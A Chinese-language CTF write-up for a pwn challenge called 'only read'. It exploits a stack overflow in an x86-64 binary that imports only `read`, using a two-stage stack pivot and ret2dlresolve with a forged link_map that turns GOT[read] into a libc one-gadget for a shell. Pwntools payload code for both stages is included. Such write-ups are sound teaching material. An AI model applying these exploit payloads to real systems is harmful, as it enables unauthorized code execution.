# only read

## 题目简述

附件是 x86-64 ELF，动态符号表中只有 `read`。程序把最多 `0x800` 字节读入仅 `0x80` 字节的栈缓冲区，形成明显的栈溢出，但没有 `puts`、`write` 或 `printf` 可用于泄漏 libc 地址。

安全属性为 Partial RELRO、NX、无 Canary、无 PIE。GOT 可写且代码地址固定，适合利用动态链接器；难点在于随题提供的是较新的 glibc 2.39，普通伪造符号表的 ret2dlresolve 会受到更严格的符号版本检查。解法是伪造 `link_map`，把已解析的 `read` 地址偏移成 libc 内的 one-gadget。

## 解题过程

### 两阶段布置数据

程序栈帧只有 `0x80` 字节，而 `read` 长度为 `0x800`，因此可覆盖保存的 `rbp` 和返回地址。第一阶段把保存的 `rbp` 改到 `.bss` 附近，再返回程序已有的 `read` 逻辑，使第二阶段载荷被读入固定的可写地址：

```python
bss_frame = 0x404c00 - 8
stage2_buf = bss_frame - 0x80
read_again = 0x401142

stage1  = b"A" * 0x80
stage1 += p64(bss_frame)
stage1 += p64(read_again)
send(stage1.ljust(0x200, b"\0"))
```

第二阶段同时包含新的栈帧、动态解析器参数、伪造的 `link_map`、`Elf64_Rela` 和 `Elf64_Dyn`。固定地址使这些结构之间的偏移可以预先计算。

### 直接进入动态解析器

x86-64 的 PLT0 通常先把真实 `link_map` 压栈，再跳转到 `ld.so` 的运行时解析入口。返回到 `plt_addr + 6` 可以跳过压入真实 `link_map` 的指令，让栈上的两个值分别被解释为：

```text
fake_link_map
reloc_arg
```

于是解析器执行等价于：

```c
_dl_fixup(fake_link_map, reloc_arg);
```

`reloc_arg` 需要让真实 `.rela.plt` 基址加上索引后恰好指向伪造的 `Elf64_Rela`：

```python
reloc_arg = (fake_rela - rela_plt) // 0x18
assert rela_plt + reloc_arg * 0x18 == fake_rela
```

### 用已解析的 `read` 推导 one-gadget

运行时 `GOT[read]` 已经保存：

$$
\operatorname{read}_{runtime}=\operatorname{libc\_base}+\operatorname{read}_{offset}.
$$

令伪造 `link_map` 的 `l_addr` 为：

$$
l\_addr=\operatorname{one\_gadget}_{offset}-\operatorname{read}_{offset}\pmod{2^{64}}.
$$

再把伪造符号表放在 `GOT[read]-8`。`Elf64_Sym` 的 `st_value` 字段位于结构偏移 8，因此解析器读取到的 `st_value` 正好是 `GOT[read]` 中的运行时地址。最终计算结果为：

$$
l\_addr+st\_value
=\operatorname{libc\_base}+\operatorname{one\_gadget}_{offset}.
$$

伪造重定位项使用 `R_X86_64_JUMP_SLOT`，即低 32 位 `r_info=7`。为了让解析器把结果写回 `GOT[read]`，设置：

$$
r\_offset=GOT[read]-l\_addr\pmod{2^{64}}.
$$

对应结构可写为：

```python
l_addr = (one_gadget_off - libc.sym["read"]) & 0xffffffffffffffff

fake_rela = flat(
    (elf.got["read"] - l_addr) & 0xffffffffffffffff,  # r_offset
    7,                                                # r_info
    0,                                                # r_addend
)

fake_symtab_dyn = flat(
    6,                     # DT_SYMTAB
    elf.got["read"] - 8,
)
```

伪造 `link_map->l_info` 中还要放入 `DT_STRTAB`、`DT_SYMTAB` 和 `DT_JMPREL` 对应的动态项指针。`DT_STRTAB` 与 `DT_JMPREL` 可指向主程序原有 `.dynamic` 项，`DT_SYMTAB` 则指向上面的伪造动态项。

### 组装第二阶段

仓库利用脚本采用的主要布局如下：

```python
linkmap_addr = bss_frame + 0x28
fake_rela    = linkmap_addr + 0x18
fake_dyn     = fake_rela + 0x18

link_map = {
    0x00: p64(l_addr),
    fake_rela - linkmap_addr: fake_rela_data,
    fake_dyn  - linkmap_addr: fake_symtab_dyn,
    0x68: p64(real_DT_STRTAB),
    0x70: p64(fake_dyn),
    0xf8: p64(real_DT_JMPREL),
}

stage2  = b"A" * 0x80
stage2 += p64(0x405000)       # 满足 one-gadget 的空指针约束
stage2 += p64(plt_addr + 6)
stage2 += p64(linkmap_addr)
stage2 += p64(reloc_arg)
stage2 += p64(0xdeadbeef)
stage2 += flat(link_map)
```

解析器根据伪造结构把 `GOT[read]` 改写为 one-gadget，并在解析返回路径中跳入该地址。脚本选择的 one-gadget 要求 `[rbp-0x78] == NULL`，所以把新 `rbp` 设为 `0x405000`，利用 `.bss` 初始为零满足约束，最终获得 shell。

## 方法总结

这道题的关键不是“只有 `read` 就无法泄漏”，而是 `read` 已经提供了一个已知符号在 libc 中的运行时地址。伪造 `link_map` 后，可用 $\text{one\_gadget}_{offset}-\text{read}_{offset}$ 作为基址修正，把现成的 `GOT[read]` 转换为目标地址。分析 ret2dlresolve 时应明确 PLT0 的栈协议、`Elf64_Rela` 的索引计算、`link_map->l_info` 的动态项指针以及目标 glibc 的版本检查，不能只套用旧版通用模板。
